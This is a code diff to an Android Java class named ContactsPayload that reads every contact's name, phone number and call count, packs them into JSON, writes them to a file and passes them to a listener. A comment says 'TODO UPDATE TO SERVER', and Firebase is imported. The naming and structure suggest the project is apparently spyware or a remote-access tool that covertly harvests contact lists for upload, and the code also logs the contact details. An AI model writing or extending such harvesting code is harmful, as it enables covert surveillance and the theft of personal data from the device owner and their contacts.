@@ -7,15 +7,22 @@ import android.os.AsyncTask;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import com.aigs.serviceone.helpers.ContactsPayloadListner;
+import com.aigs.serviceone.helpers.FileSystem;
 import com.aigs.serviceone.helpers.PayloadTypes;
 import com.google.firebase.database.FirebaseDatabase;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.File;
 import java.lang.ref.WeakReference;
 import java.util.HashSet;
 
 public class ContactsPayload extends AsyncTask<String, String, Integer> {
 
-    WeakReference<Context> context;
+    private final WeakReference<Context> context;
+    private ContactsPayloadListner contactsPayloadListner;
 
     public ContactsPayload(Context context) {
         this.context = new WeakReference<>(context);
@@ -28,7 +35,10 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
             ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
     };
 
-
+    public ContactsPayload setOnContactPayloadListener(ContactsPayloadListner contactsPayloadListner){
+        this.contactsPayloadListner = contactsPayloadListner;
+        return this;
+    }
     @Override
     protected Integer doInBackground(String... strings) {
         try {
@@ -44,7 +54,9 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
                     final int timesContactedIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED);
 
                     String name, number, times_called;
+                    JSONArray jsonArray = new JSONArray();
                     while (cursor.moveToNext()) {
+                        JSONObject jsonObject = new JSONObject();
                         name = cursor.getString(nameIndex);
                         number = cursor.getString(numberIndex);
                         times_called = cursor.getString(timesContactedIndex);
@@ -52,11 +64,21 @@ public class ContactsPayload extends AsyncTask<String, String, Integer> {
                         if (!mobileNoSet.contains(number)) {
                             // contactList.add(new Contact(name, number));
                             //TODO UPDATE TO SERVER
+                            jsonObject.put("NAME",name);
+                            jsonObject.put("NUMBER",number);
+                            jsonObject.put("TIMES_CALLED",times_called);
+
+                            jsonArray.put(jsonObject);
+
                             mobileNoSet.add(number);
                             Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                     + " No = " + number + " Contacted " + times_called + " Times");
                         }
                     }
+
+                    File file = FileSystem.createInstance(context.get()).writeContactsData(jsonArray.toString());
+                    contactsPayloadListner.onDataExtracted(file,jsonArray.toString());
+
                 } finally {
                     cursor.close();
                 }
